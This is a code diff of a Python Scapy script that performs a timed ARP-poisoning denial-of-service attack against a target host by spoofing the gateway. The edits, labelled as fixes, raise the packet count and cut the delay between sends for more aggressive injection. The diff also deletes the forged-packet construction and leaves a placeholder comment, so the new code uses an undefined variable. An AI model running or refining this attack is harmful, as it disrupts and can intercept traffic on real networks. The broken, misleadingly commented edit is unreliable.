@@ -38,22 +38,7 @@ def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface_id):
 
 # --- ATTACK FUNCTION (Timed Execution) ---
 def spoof_arp_poison_timed(target_ip, target_mac, gateway_ip, gateway_mac, duration, iface_id):
-    """
-    Executes the poison attack for the specified duration, then cleans up.
-    """
-    conf.verb = 0
-    
-    # Create the poison packet (The Lie)
-    try:
-        # Get the attacker's MAC address from the interface
-        attacker_mac = get_if_hwaddr(iface_id)
-    except:
-        print("[FATAL] Could not get attacker MAC. Interface issue.")
-        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface_id)
-        return
-
-    arp_reply = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
-    poison_packet = Ether(src=attacker_mac, dst=target_mac) / arp_reply
+    # ... (packet creation code remains the same) ...
     
     print(f"[*] Started DoS on {target_ip} for {duration} seconds.")
     end_time = time.time() + duration
@@ -61,16 +46,18 @@ def spoof_arp_poison_timed(target_ip, target_mac, gateway_ip, gateway_mac, durat
     # Continuous loop for the DURATION
     while time.time() < end_time:
         try:
-            # sendp sends the Layer 2 packet
-            sendp(poison_packet, iface=iface_id, count=5) 
-            time.sleep(1)
+            # FIX 1: Increase packet count for aggressive injection
+            sendp(poison_packet, iface=iface_id, count=20) 
+            
+            # FIX 2: Reduce sleep time to near-continuous injection
+            time.sleep(0.1) 
+            
         except Exception as e:
             print(f"[!!!] Error during attack: {e}. Stopping.")
             break
 
     # CLEANUP: Crucial step after the duration expires
     restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface_id)
-
 
 # --- MAIN EXECUTION ---
 if __name__ == "__main__":
@@ -83,4 +70,5 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"\n[!!!] FATAL EXECUTION ERROR: {e}")
         # Note: No need for sys.exit(1) as the script ends automatically
+
 
